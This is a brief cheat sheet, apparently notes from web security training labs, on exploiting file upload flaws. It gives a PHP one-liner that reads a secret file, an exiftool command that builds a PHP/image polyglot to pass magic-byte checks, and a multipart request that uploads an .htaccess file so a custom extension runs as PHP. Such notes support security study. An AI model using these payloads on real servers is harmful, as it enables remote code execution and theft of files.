# File Upload

PHP Basic

    <?php echo file_get_contents('/home/carlos/secret'); ?>

PHP Polygot: when it check the magic byte ("ws.png not a valid image...")

    exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" network.png -o polyglot.php

Extension restriction

    - Create an .htaccess: this will make the .foo extension to be executed as `application/x-httpd-php`. Important to change the to `text/plain`.

        ------WebKitFormBoundaryQ8Mj8OH94gGEFaGl
        Content-Disposition: form-data; name="avatar"; filename=".htaccess"
        Content-Type: text/plain
        
        AddType application/x-httpd-php .foo
